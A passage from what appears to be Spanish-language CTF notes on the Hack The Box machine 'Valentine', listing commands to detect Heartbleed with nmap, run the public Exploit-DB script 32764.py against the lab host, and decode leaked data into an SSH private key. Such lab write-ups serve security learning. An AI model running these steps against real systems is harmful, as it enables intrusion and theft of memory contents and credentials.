. Verificar vulnerabilidad:
   ```bash
   nmap --script ssl-heartbleed -p80,443,22 10.10.10.79
   ```
   ![[Valentine10.png]]
2. Exploit con Searchsploit:
   ```bash
   searchsploit -m multiple/remote/32764.py
   python2.7 32764.py 10.10.10.79 -p 443
   ```
   ![[Valentine11.png]]
3. Decodificar cadena Base64:
   ```bash
   echo "BASE64_STRING" | base64 -d > id_rsa
   chmod 600 id_rsa
   ```
   ![[Valentine12.png]]
   ![[Valentine13.png]]